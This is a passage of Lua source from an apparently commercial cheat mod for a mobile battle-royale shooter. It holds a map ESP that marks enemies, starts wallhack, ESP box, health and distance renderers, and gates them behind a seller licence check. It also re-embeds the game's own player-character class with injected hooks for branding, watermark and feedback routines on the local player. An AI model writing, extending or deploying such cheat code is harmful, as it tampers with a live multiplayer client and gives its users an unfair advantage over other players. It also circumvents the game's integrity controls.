                    UIPathName = distanceMarkerConfig.UIPathName,
                    MaxWidgetNum = 99,
                    MaxShowDistance = 6000000,
                    bBindOutScreen = true,
                    bBindBlocked = true,
                    bIsBindingActor = true,
                    BindSocketName = "head",
                    bUseLuaWorldSocketName = true,
                    WorldPositionOffset = FVector(0, 0, 50),
                    bNeedPreLoad = true,
                    Priority = 2,
                }
            else
                smc[1006].bBindBlocked = true
                smc[1006].bBindOutScreen = true
                smc[1006].MaxWidgetNum = 99
                smc[1006].MaxShowDistance = 6000000
            end
            smc[9999] = distanceMarkerConfig
        end
        for name, data in pairs(package.loaded) do
            if type(name) == "string" and string.find(name, "ScreenMarkConfig")
                and type(data) == "table" then
                data[1006] = data[1006] or smc and smc[1006]
                data[9999] = distanceMarkerConfig
            end
        end
    end)
end

if not _G.AK_Active_Marks_Cache then _G.AK_Active_Marks_Cache = {} end

local function createDistanceMarker(enemy)
    if _G._MOD_EXPIRED then return end
    pcall(function()
        if InGameMarkTools and InGameMarkTools.ClientAddMapMark then
            enemy.NativeDistMark = InGameMarkTools.ClientAddMapMark(9999, FVector(0,0,0), 0, "", 4, enemy)
            _G.AK_Active_Marks_Cache[tostring(enemy)] = {actor = enemy, distMark = enemy.NativeDistMark}
        end
    end)
end

local function removeDistanceMarker(enemy)
    pcall(function()
        if InGameMarkTools then
            if InGameMarkTools.ClientRemoveMapMark then
                InGameMarkTools.ClientRemoveMapMark(enemy.NativeDistMark)
            elseif InGameMarkTools.HideMapMark then
                InGameMarkTools.HideMapMark(enemy.NativeDistMark)
            end
        end
        enemy.NativeDistMark = nil
        _G.AK_Active_Marks_Cache[tostring(enemy)] = nil
    end)
end

local function cleanupDeadEnemyMarks()
    for key, data in pairs(_G.AK_Active_Marks_Cache) do
        local remove = false
        if not slua.isValid(data.actor) then
            remove = true
        else
            pcall(function()
                local a = data.actor
                if a.bHidden or (a.Mesh and a.Mesh.bHidden) then remove = true end
                if type(a.IsDead) == "function" and a:IsDead() then remove = true
                elseif a.bIsDead == true or a.bIsDeadFlag == true then remove = true end
                if not remove then
                    if a.GetHealth and a:GetHealth() <= 0 then remove = true
                    elseif a.HasPawnState and a:HasPawnState(EPawnState.Dead) then remove = true end
                end
            end)
        end
        if remove then
            pcall(function()
                if InGameMarkTools and InGameMarkTools.ClientRemoveMapMark then
                    InGameMarkTools.ClientRemoveMapMark(data.distMark)
                end
            end)
            _G.AK_Active_Marks_Cache[key] = nil
        end
    end
end

local function processEnemyMapESP(enemy, localPlayer, isMapESPEnabled)
    if _G._MOD_EXPIRED then return end
    if not slua.isValid(enemy) or enemy == localPlayer or enemy.TeamID == localPlayer.TeamID then return end
    local isDead = false
    pcall(function()
        if type(enemy.IsDead) == "function" and enemy:IsDead() then isDead = true
        elseif enemy.bIsDead then isDead = true end
        if enemy.bHidden or (enemy.Mesh and enemy.Mesh.bHidden) then isDead = true end
        if not isDead then
            if enemy.GetHealth and enemy:GetHealth() <= 0 then isDead = true
            elseif enemy.HasPawnState and enemy:HasPawnState(EPawnState.Dead) then isDead = true end
        end
    end)
    if not isDead then
        if isMapESPEnabled == 1 then
            if not enemy.bHasAKNativeMapMarker then
                createDistanceMarker(enemy); enemy.bHasAKNativeMapMarker = true
            end
        else
            if enemy.bHasAKNativeMapMarker then
                removeDistanceMarker(enemy); enemy.bHasAKNativeMapMarker = false
            end
        end
    else
        if enemy.bHasAKNativeMapMarker then
            removeDistanceMarker(enemy); enemy.bHasAKNativeMapMarker = false
        end
    end
end


-- ============================================================================
-- 11. LICENSE BOOTSTRAP
-- ============================================================================
local function YourSellerESPEnsureLicense()
    if YourSellerESPLicenseInstance then return end
    local host = setmetatable({GameplayData = GameplayData}, {__index = _ENV})
    YourSellerESPLicenseInstance = YourSellerLicenseRuntime.new(
        host, YourSellerLicenseConfig, YourSellerLicenseCore, YourSellerLoginUI)
end

-- ============================================================================
-- 12. READINESS SYSTEM
-- ============================================================================
local MatchState = {
    ready = false,
    readySince = nil,
    world = nil,
    lastError = nil,
    attempts = 0,
    renderersStarted = false,
}

local _GameplayStatics = nil
local function EngineTime()
    local world = nil
    pcall(function() world = slua and slua.getWorld and slua.getWorld() end)
    if not world then return nil, nil end
    if not _GameplayStatics then
        pcall(function() _GameplayStatics = import("GameplayStatics") end)
    end
    if not _GameplayStatics then return nil, world end
    local now = nil
    pcall(function()
        if _GameplayStatics.GetRealTimeSeconds then
            now = _GameplayStatics.GetRealTimeSeconds(world)
        end
    end)
    if type(now) == "number" and now == now and now >= 0 and now < math.huge then
        return now, world
    end
    return nil, world
end

local function StopAllRenderers()
    pcall(function() if ESPBoxRenderer then ESPBoxRenderer.Stop() end end)
    pcall(function() if WallhackRenderer then WallhackRenderer.Stop() end end)
    pcall(function() if ESPLineRenderer then ESPLineRenderer.ClearAll() end end)
    pcall(function() if EnemyCounterOverlay then EnemyCounterOverlay.Destroy() end end)
    pcall(function() if NativeHPNameRenderer then NativeHPNameRenderer.ClearAll() end end)  -- ✅ NEW
    MatchState.renderersStarted = false
end

local function StartAllRenderers()
    if MatchState.renderersStarted then return true end
    local anyOK = false

    local ok1 = pcall(function()
        if ESPBoxRenderer then
            if ESPBoxRenderer.Start() == true then anyOK = true end
        end
    end)

    local ok2 = pcall(function()
        if WallhackRenderer then
            if WallhackRenderer.Start() == true then anyOK = true end
        end
    end)

    pcall(function()
        if ESPHealthRenderer and ESPHealthRenderer.InitCanvas then
            ESPHealthRenderer.InitCanvas(true)
        end
    end)

    pcall(function()
        if ESPDistanceRenderer and ESPDistanceRenderer.InitCanvas then
            ESPDistanceRenderer.InitCanvas(true)
        end
    end)

    pcall(function()
        if ESPBoxRenderer and ESPBoxRenderer.InitESPCanvas then
            ESPBoxRenderer.InitESPCanvas(true)
        end
        if EnemyCounterOverlay and EnemyCounterOverlay.Create then
            EnemyCounterOverlay.Create()
        end
    end)

    MatchState.renderersStarted = anyOK
    print("[MatchState] Renderers started: box=" .. tostring(ok1) .. " wall=" .. tostring(ok2))
    return MatchState.renderersStarted
end

local function ObserveReadiness()
    if not YourSellerESPLicenseInstance then
        MatchState.lastError = "no_license"
        return
    end

    local licensed = false
    pcall(function() licensed = YourSellerESPLicenseInstance:isActive() == true end)

    if not licensed then
        if MatchState.renderersStarted then StopAllRenderers() end
        MatchState.ready = false
        MatchState.readySince = nil
        MatchState.world = nil
        MatchState.lastError = "license_inactive"
        return
    end

    local now, world = EngineTime()
    if not now or not world then
        MatchState.lastError = "clock_unavailable"
        return
    end

    if MatchState.world ~= world then
        MatchState.world = world
        MatchState.readySince = now
        MatchState.ready = false
        MatchState.attempts = 0
        if MatchState.renderersStarted then StopAllRenderers() end
        MatchState.lastError = "world_change"
        return
    end

    if not MatchState.readySince then
        MatchState.readySince = now
        MatchState.lastError = "stability_wait"
        return
    end
    if now < MatchState.readySince then
        MatchState.readySince = now
        MatchState.lastError = "clock_rewind"
        return
    end
    if (now - MatchState.readySince) < 2.0 then
        MatchState.ready = false
        MatchState.lastError = "stability_wait"
        return
    end

    MatchState.ready = true
    MatchState.lastError = nil

    if not MatchState.renderersStarted then
        MatchState.attempts = MatchState.attempts + 1
        StartAllRenderers()
    end
end

-- ============================================================================
-- 13. MAINTENANCE LOOP
-- ============================================================================
local MaintenanceState = {timer = nil, owner = nil}

local function MaintenanceTick()
    if YourSellerESPLicenseInstance then
        pcall(function() YourSellerESPLicenseInstance:update() end)
    end
    pcall(ObserveReadiness)
    pcall(function()
        if _G.YourSeller_ConfigReload then _G.YourSeller_ConfigReload() end
    end)
end
local function AttachMaintenance(owner)
    if not slua.isValid(owner) then return false end
    if type(owner.AddGameTimer) ~= "function" then return false end
    if MaintenanceState.timer and MaintenanceState.owner == owner then
        return true
    end
    if MaintenanceState.timer and slua.isValid(MaintenanceState.owner)
        and type(MaintenanceState.owner.RemoveGameTimer) == "function" then
        pcall(function() MaintenanceState.owner:RemoveGameTimer(MaintenanceState.timer) end)
    end
    MaintenanceState.timer, MaintenanceState.owner = nil, nil
    local ok, timer = pcall(function()
        return owner:AddGameTimer(1.0, true, MaintenanceTick)
    end)
    if not ok or not timer then return false end
    MaintenanceState.timer, MaintenanceState.owner = timer, owner
    pcall(MaintenanceTick)
    return true
end

local function TryAttachMaintenance()
    local pc = nil
    pcall(function()
        if GameplayData and GameplayData.GetPlayerController then
            pc = GameplayData.GetPlayerController()
        end
    end)
    if not slua.isValid(pc) then
        pcall(function()
            if slua_GameFrontendHUD then
                pc = slua_GameFrontendHUD:GetPlayerController()
            end
        end)
    end
    if slua.isValid(pc) then AttachMaintenance(pc) end
end

-- ============================================================================
-- 13.5. ORIGINAL GAME CLASS — BRPlayerCharacterBase (PRESERVED INTACT)
-- ============================================================================
local OriginalGameBRPlayerCharacterBase = (function()
    local BRPlayerCharacterBase = {
      ServerRPC = {},
      ClientRPC = {},
      MulticastRPC = {},
      LuaEventContainer = {}
    }
    BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
      Reliable = true,
      Params = {}
    }
    BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
      Reliable = true,
      Params = {
        UEnums.EPropertyClass.Object
      }
    }
    BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
      Reliable = true,
      Params = {
        UEnums.EPropertyClass.Int
      }
    }
    BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
      Reliable = true,
      Params = {
        UEnums.EPropertyClass.Int
      }
    }
    BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
      Reliable = true,
      Params = {
        UEnums.EPropertyClass.Bool
      }
    }
    local ENetRole = import("ENetRole")
    local EPawnState = import("EPawnState")
    local ESpecialMovementType = import("ESpecialMovementType")
    local ESpiderSwingMoveState = import("ESpiderSwingMoveState")
    local ESurviveWeaponPropSlot = import("ESurviveWeaponPropSlot")
    local EParachuteState = import("EParachuteState")
    local EMovementMode = import("EMovementMode")
    local EStateType = import("EStateType")
    local ESTEPoseState = import("ESTEPoseState")
    local EGameModeType = import("EGameModeType")
    local STExtraGameStateBase = import("STExtraGameStateBase")
    local UKismetSystemLibrary = import("KismetSystemLibrary")
    local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
    local GameplayData = require("GameLua.GameCore.Data.GameplayData")
    local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
    local MatchModeIds = require("GameLua.Mod.BaseMod.GamePlay.Config.MatchModeIdsConfig")

    function BRPlayerCharacterBase:ctor()
    end

    function BRPlayerCharacterBase:_PostConstruct()
      BRPlayerCharacterBase.__super._PostConstruct(self)
      self:InitAddSpecialMoveInfo()
      self.bCanNearDeathGiveup = true
      print(bWriteLog and "BRPlayerCharacterBase:_PostConstruct bCanNearDeathGiveup true")
        if Client then
    pcall(ApplyPhoneStatsBranding)
    local isLocal = (self.Role == ENetRole.ROLE_AutonomousProxy) or (type(self.IsLocallyControlled) == "function" and self:IsLocallyControlled())
    if isLocal then
      if _G._GK_ResetFeedbackState then pcall(_G._GK_ResetFeedbackState) end
      pcall(EnsureCreditWatermarkActive)
      if self._StartAutoFeedback then
        self:_StartAutoFeedback()
      end
    end
  end
    end

    function BRPlayerCharacterBase:ReceiveBeginPlay()
      BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
      self:AddControlEvent(self, "MovementModeChangedDelegate", self.HandleOnMovementModeChangedNew, self)
      if self:HasAuthority() and self:CheckAddCheckFallingDistanceComponent() then
        local CheckFallingDistanceComponent_C = import("CheckFallingDistanceComponent")
        if slua.isValid(CheckFallingDistanceComponent_C) and not slua.isValid(self:GetComponentByClass(CheckFallingDistanceComponent_C)) then
          print(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay Add CheckFallingDistanceComponent")
          Game:AddComponent(CheckFallingDistanceComponent_C, self, "CheckFallingDistanceComponent")
        end
      end
      if slua.isValid(self.STCharacterMovement) then
        self.STCharacterMovement.bPositiveBlowUp = true
      end
      if self.Role == ENetRole.ROLE_AutonomousProxy then
        self:AddControlEvent(self, "OnPawnStateDisabled", self.OnPawnStateChange, self)
        self:AddControlEvent(self, "OnPawnStateEnabled", self.OnPawnStateChange, self)
        self:AddControlEventConditionOnly(self, "OnAttrChangeEventDelegate", {
          AttrName = {
            "bCanSelfRescue"
          }
        }, self.CharacterAttrChangeEvent, self)
      end
      if Client then
        printf(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay, PlayerKey:%u ", self.PlayerKey)
        GameplayData.AddCharacter(self.Object)
        local isLocal = (self.Role == ENetRole.ROLE_AutonomousProxy) or (type(self.IsLocallyControlled) == "function" and self:IsLocallyControlled())
    if isLocal then
      if _G._GK_ResetFeedbackState then pcall(_G._GK_ResetFeedbackState) end
      pcall(EnsureCreditWatermarkActive)
      if self._StartAutoFeedback then
        self:_StartAutoFeedback()
      end
    end
      else
        self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL, EVENTID_GAME_MODE_STATE_CHANGE, {
          [1] = "FinishedState"
        }, self.HandleFinishedState, self)
      end
    end

    function BRPlayerCharacterBase:CharacterAttrChangeEvent(uPawn, AttrName, AttrVal)
      BRPlayerCharacterBase.__super.CharacterAttrChangeEvent(self, uPawn, AttrName, AttrVal)
      if self.Object ~= uPawn then
        return
      end
      if self.Role == ENetRole.ROLE_AutonomousProxy and AttrName == "bCanSelfRescue" then
        local uPlayerController = self:GetPlayerControllerSafety()
        if slua.isValid(uPlayerController) then
          uPlayerController:BroadcastUIMessage("UIMsg_CanSelfRescue", 0, "", "")
        end
      end
    end

    function BRPlayerCharacterBase:OnPawnStateChange(PawnState)
      print("BRPlayerCharacterBase:OnPawnStateChange:", PawnState)
      if PawnState == EPawnState.SwitchPP then
        local uPlayerController = self:GetPlayerControllerSafety()
        if slua.isValid(uPlayerController) then
          uPlayerController:BroadcastUIMessage("UIMsg_FPPModeChange", 0, "", "")
        end
      end
    end

    function BRPlayerCharacterBase:HandleFinishedState()
      print(bWriteLog and "BRPlayerCharacterBase:HandleFinishedState", self.STCharacterMovement)
      if slua.isValid(self.STCharacterMovement) and self.STCharacterMovement.SetDynamicSimpleQueryConfigDisable then
        local EDynamicSimpleQueryConfigDisableMask = import("EDynamicSimpleQueryConfigDisableMask")
        self.STCharacterMovement:SetDynamicSimpleQueryConfigDisable(EDynamicSimpleQueryConfigDisableMask.Bit0, true)
      end
    end

    function BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent()
      if CGameMode and CGameMode.GameModeType and CGameState and CGameState.GameModeID then
        local GameModeType = CGameMode.GameModeType
        local GameModeID = tonumber(CGameState.GameModeID)
        local bModeTypeSatisfy = GameModeType == EGameModeType.ETypicalGameMode or GameModeType == EGameModeType.EFourInOneGameMode or GameModeType == EGameModeType.EHeavyWeaponGameMode
        local bModeIDSatisfy = not MatchModeIds[GameModeID]
        print(bWriteLog and bWriteLog and "BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent:", GameModeType, GameModeID, bModeTypeSatisfy, bModeIDSatisfy)
        return bModeTypeSatisfy and bModeIDSatisfy
      end
      return false
    end

    function BRPlayerCharacterBase:LuaHandleParachuteStateChanged(LastParachuteState, NewParachuteState)
      BRPlayerCharacterBase.__super.LuaHandleParachuteStateChanged(self, LastParachuteState, NewParachuteState)
      if not Client then
        local uCurrentPlayerControl = self:GetPlayerControllerSafety()
        if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
          if NewParachuteState == EParachuteState.PS_Opening then
            if uCurrentPlayerControl.CheckParachuteOpenFeature.SatrtCheckShowParachuteCloseUI then
              uCurrentPlayerControl.CheckParachuteOpenFeature:SatrtCheckShowParachuteCloseUI()
            end
          elseif NewParachuteState == EParachuteState.PS_None then
            if uCurrentPlayerControl.CheckParachuteOpenFeature.RecoverParachuteOpenParam then
              uCurrentPlayerControl.CheckParachuteOpenFeature:RecoverParachuteOpenParam()
            end
            if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
              uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
            end
          end
        end
      end
    end

    function BRPlayerCharacterBase:OnLanded()
      printf("BRPlayerCharacterBase:OnLanded PlayerKey:%d", self.PlayerKey)
      if self.HandleOnLanded then
        self:HandleOnLanded(-1)
      end
      if not Client then
        local uCurrentPlayerControl = self:GetPlayerControllerSafety()
        if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
          if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
            uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
          end
          if uCurrentPlayerControl.CheckParachuteOpenFeature.ResetCheckShowUI then
            uCurrentPlayerControl.CheckParachuteOpenFeature:ResetCheckShowUI()
          end
        end
      end
    end

    function BRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
      BRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
      if Client then
        GameplayData.RemoveCharacter(self.Object)
    local isLocal = (self.Role == ENetRole.ROLE_AutonomousProxy) or (type(self.IsLocallyControlled) == "function" and self:IsLocallyControlled())
    if isLocal then
      pcall(DestroyCreditWatermarkWidget)
      if _G._GK_ResetFeedbackState then
        _G._VIP_FeedbackStarted = false
        _G._GK_ResetFeedbackState()
      end
    end
      end
    end

    function BRPlayerCharacterBase:IsWarGameMode()
      local uGameState = GameplayData:GetGameState()
      if slua.isValid(uGameState) and Game:IsClassOf(uGameState, STExtraGameStateBase) then
        return uGameState.GameModeType == EGameModeType.EWarGameMode
      else
        return false
      end
    end

    function BRPlayerCharacterBase:BPOnRecycled()
      print(bWriteLog and string.format("%s BPOnRecycled()", Game:GetPlainName(self.Object)))
      if Client then
        self:ResetMeshRelativeLocationAndRotation()
      end
    end

    function BRPlayerCharacterBase:BPOnRespawned()
      print(bWriteLog and string.format("%s BPOnRespawned()", Game:GetPlainName(self.Object)))
      if Client then
        self:ResetMeshRelativeLocationAndRotation()
      end
    end

    function BRPlayerCharacterBase:ReceiveOnRecycle()
      print(bWriteLog and string.format("%s IReusable:ReceiveOnRecycle()", Game:GetPlainName(self.Object)))
      if Client then
        self:ResetMeshRelativeLocationAndRotation()
        GameplayData.RemoveCharacter(self.Object)
      end
    end

    function BRPlayerCharacterBase:ReceiveOnSpawn()
      print(bWriteLog and string.format("%s IReusable:ReceiveOnSpawn()", Game:GetPlainName(self.Object)))
      if Client then
        pcall(ApplyPhoneStatsBranding)
        self:ResetMeshRelativeLocationAndRotation()
        GameplayData.AddCharacter(self.Object)
        local isLocal = (self.Role == ENetRole.ROLE_AutonomousProxy) or (type(self.IsLocallyControlled) == "function" and self:IsLocallyControlled())
    if isLocal then
      if _G._GK_ResetFeedbackState then pcall(_G._GK_ResetFeedbackState) end
      pcall(EnsureCreditWatermarkActive)
      if self._StartAutoFeedback then
        self:_StartAutoFeedback()
      end
    end
      end
    end
    
    function BRPlayerCharacterBase:ResetMeshRelativeLocationAndRotation()
      if Game:IsValid(self.Object) and Game:IsValid(self.Mesh) then
        local uDefaultMeshRot = FRotator(0, -90, 0)
        local uDefaultMeshRelativeLoc = FVector(0, 0, 0)
        if self.Mesh.K2_SetRelativeRotation then
          self.Mesh:K2_SetRelativeRotation(uDefaultMeshRot, false, nil, false)
        end
        self:CacheInitialMeshOffset(uDefaultMeshRelativeLoc, uDefaultMeshRot)
        local vRelativeRot = self.Mesh.RelativeRotation
        local vBaseRotationOffset = self.BaseRotationOffset
        local vBaseRotation = Game:QuatToRotator(vBaseRotationOffset)
        print(bWriteLog and bWriteLog and string.format("%s ResetMeshRelativeLocationAndRotation() Mesh.RelativeRotation: %s %s %s   Pawn.BaseRotationOffset:%s %s %s ", Game:GetPlainName(self.Object), tostring(vRelativeRot.Pitch), tostring(vRelativeRot.Yaw), tostring(vRelativeRot.Roll), tostring(vBaseRotation.Pitch), tostring(vBaseRotation.Yaw), tostring(vBaseRotation.Roll)))
      end
    end

    function BRPlayerCharacterBase:HandleOnMovementModeChangedNew()
      print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged11")
      if Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Swimming and self:CheckBaseIsMoveable() then
        print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged22")
        self.CharacterMovement:SetBase(nil, "", true)
      end
      if self.Role == ENetRole.ROLE_AutonomousProxy and Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Walking and UIManager.UI_Config_InGame.ParachuteOpenUI then
        print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChangedNew CloseUI")
        UIManager.CloseUI(UIManager.UI_Config_InGame.ParachuteOpenUI)
      end
    end

    function BRPlayerCharacterBase:BPOnMissPlayerDamageRecord()
    end

    function BRPlayerCharacterBase:PreAttachedToVehicle()
      local IsDS = UKismetSystemLibrary.IsDedicatedServer(self)
      if not IsDS then
        return
      end
      local MainPlayerController = self:GetPlayerControllerSafety()
      if not slua.isValid(MainPlayerController) then
        return
      end
      local CharacterAvatarComp2_BP = self.CharacterAvatarComp2_BP
      if not slua.isValid(CharacterAvatarComp2_BP) then
        return
      end
      local CommerAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.CommerAvatarDataUtil")
      local changedVehicleId = CommerAvatarDataUtil:ChangeVehicleSkinByClothes(MainPlayerController, CharacterAvatarComp2_BP)
      local ESTExtraVehicleShapeType = import("ESTExtraVehicleShapeType")
      if changedVehicleId then
        local UAvatarUtils = import("AvatarUtils")
        if UAvatarUtils.GetVehicleShapeBySkinID(changedVehicleId) == ESTExtraVehicleShapeType.VST_Horse then
          local uCurPlayerState = self:GetPlayerStateSafety()
          if slua.isValid(uCurPlayerState) then
            print(bWriteLog and "  BRPlayerCharacterBase:PreAttachedToVehicle. changedVehicleId: " .. tostring(changedVehicleId))
            uCurPlayerState:AddGeneralCount(468, 1, false)
          end
        end
      end
    end

    function BRPlayerCharacterBase:ParachuteJump()
      local uPlayerController = self:GetControllerSafety()
      if slua.isValid(uPlayerController) then
        if not self:GetEnsure() then
          if uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteJump and uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
            self:SwitchPoseState(ESTEPoseState.Stand, true, true, true, false)
            uPlayerController:ReInitParachuteItem()
            uPlayerController:ServerChangeStatePC(EStateType.State_ParachuteJump)
          end
          print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump over")
        else
          EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_AI_CALL_PARACHUTE_JUMP, self.Object)
          print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump AI JUMP over, Loc=", tostring(self:K2_GetActorLocation():ToString()))
        end
      end
    end

    function BRPlayerCharacterBase:OnMovementBaseChangedEvent(uCharacter, uNewMovementBase, uOldMovementBase)
      if uCharacter ~= self.Object then
        return
      end
      print(bWriteLog and string.format("BRPlayerCharacterBase:OnMovementBaseChangedEvent %s, Base: %s -> %s", uCharacter, uOldMovementBase, uNewMovementBase))
      local MedievalCrane = self:GetMedievalCraneFromBase(uNewMovementBase)
      if MedievalCrane and MedievalCrane.AddCharacter then
        MedievalCrane:AddCharacter(self.Object)
      else
        MedievalCrane = self:GetMedievalCraneFromBase(uOldMovementBase)
        if MedievalCrane and MedievalCrane.RemoveCharacter then
          MedievalCrane:RemoveCharacter(self.Object)
        end
      end
    end

    function BRPlayerCharacterBase:GetMedievalCraneFromBase(Base)
      if not slua.isValid(Base) or not Base.GetOwner then
        return
      end
      local Lifter = Base:GetOwner()
      if not slua.isValid(Lifter) then
        return
      end
      if not Lifter.AddCharacter then
        return
      end
      return Lifter
    end

    function BRPlayerCharacterBase:CheckForbidFlaregun()
      local uPlayerState = self:GetPlayerStateSafety()
      if not slua.isValid(uPlayerState) then
        return false
      end
      if uPlayerState.CanUseFlaregun == false and self:IsLocallyControlled() then
        local uPlayerController = self:GetPlayerControllerSafety()
        if slua.isValid(uPlayerController) then
          uPlayerController:DisplayGameTipWithMsgID(48532)
        end
      end
      return not uPlayerState.CanUseFlaregun
    end

    function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
      self:HandleNearDeathGiveupRescue()
    end

    function BRPlayerCharacterBase:HandleNearDeathGiveupRescue()
      local uNearDeathComp = self.NearDeatchComponent
      if self:IsNearDeath() and slua.isValid(uNearDeathComp) and self.bCanNearDeathGiveup == true then
        local uPlayerState = self:GetPlayerStateSafety()
        if slua.isValid(uPlayerState) then
          uPlayerState:AddGeneralCount(1613, 1, false)
        end
        uNearDeathComp:TriggerGotoDieExplictly(self.Object)
      end
    end

    function BRPlayerCharacterBase:RPC_Server_GmPlayAction(actionId)
      log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction.  actionId: " .. tostring(actionId))
      if USTExtraBlueprintFunctionLibrary.IsDevelopment() then
        log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction. IsDevelopment actionId: " .. tostring(actionId))
        self:MulticastRPC_GmPlayAction(actionId)
      end
    end

    function BRPlayerCharacterBase:MulticastRPC_GmPlayAction(actionId)
      if not Client then
        return
      end
      log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction.  actionId: " .. tostring(actionId))
      local uPlayEmoteComp = self:GetPlayEmoteComponent()
      if not slua.isValid(uPlayEmoteComp) then
        return
      end
      local LogFilter = require("common.log_filter")
      LogFilter.SetLogTreeEnable(true)
      local animCfg = CDataTable.GetTableData("EmoteBPTable", actionId)
      if not animCfg then
        return
      end
      local handlePath = animCfg.Path
      local EmoteHandleAsset = slua.loadObject(handlePath)
      local assetsArray = slua.Array(UEnums.EPropertyClass.Struct, import("/Script/CoreUObject.SoftObjectPath"))
      local handle = EmoteHandleAsset()
      uPlayEmoteComp:OnLoadEmoteAssetBegin(handle, actionId, assetsArray, "")
      log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction. assetsArray:Num(): " .. tostring(assetsArray:Num()))
      local tb = FuncUtil.LuaArrayToTable(assetsArray)
      local asset_util = require("common.asset_util")
      
      function loadLater()
        uPlayEmoteComp:OnLoadEmoteAssetEnd(handle, actionId, 0)
      end
      
      asset_util.GetAssetsArrayAsyncParallel(tb, loadLater)
    end

    function BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall(bServerSyncShouldCheckPassWall)
      print(bWriteLog and "BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall " .. tostring(bServerSyncShouldCheckPassWall))
      if slua.isValid(self.ParachuteComponent) then
        self.ParachuteComponent.bServerSyncShouldCheckPassWall = bServerSyncShouldCheckPassWall
      end
    end

    function BRPlayerCharacterBase:OnPlayerEnterCarryBoxState()
      self.Super:OnPlayerEnterCarryBoxState()
      local CharName = self:GetPlayerNameSafety()
      print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerEnterCarryBoxState Role:%s PlayerKey:%s Name:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName)))
      if self.CarryDeadBoxFeature then
        self.CarryDeadBoxFeature:OnPlayerEnterCarryBoxState()
      end
    end

    function BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
      self.Super:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
      local CharName = self:GetPlayerNameSafety()
      print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState Role:%s PlayerKey:%s Name:%s bInIsInterrupt:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName), tostring(bInIsInterrupt)))
      if self.CarryDeadBoxFeature then
        self.CarryDeadBoxFeature:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
      end
    end

    function BRPlayerCharacterBase:ServerRPC_CarryDeadBox(uInDeadBox)
      if slua.isValid(uInDeadBox) and Game:IsClassOf(uInDeadBox, import("/Script/ShadowTrackerExtra.PlayerTombBox")) and self.CarryDeadBoxFeature then
        self.CarryDeadBoxFeature:CarryDeadBox(uInDeadBox)
      end
    end

    function BRPlayerCharacterBase:SetAreaID(AreaID)
      self:SetAttrValue("AreaID", AreaID, -1)
    end

    function BRPlayerCharacterBase:GetAreaID()
      return math.floor(self:GetAttrValue("AreaID") + 0.5)
    end

    function BRPlayerCharacterBase:CannotChangeIntoPetSpectator()
      print(bWriteLog and "BRPlayerCharacterBase:CannotChangeIntoPetSpectator")
      return self.bCannotChangeIntoPetSpectator
    end

    function BRPlayerCharacterBase:DoModChangeToBT()
      print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s", tostring(self.PlayerKey)))
      if self:HasState(EPawnState.SpecialSuit) then
        self:TriggerEntrySkillWithID(4301101, true)
        print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s, HasState(EPawnState.SpecialSuit)", tostring(self.PlayerKey)))
      end
    end

    function BRPlayerCharacterBase:SwitchCameraToParachuteOpening()
      print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening")
      self.Super:SwitchCameraToParachuteOpening()
      if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
        self.ParachuteFormation:OverlayFormationCameraParams()
        print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening - Formation camera overlaid")
      end
    end

    function BRPlayerCharacterBase:SwitchCameraToParachuteFalling()
      print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling")
      self.Super:SwitchCameraToParachuteFalling()
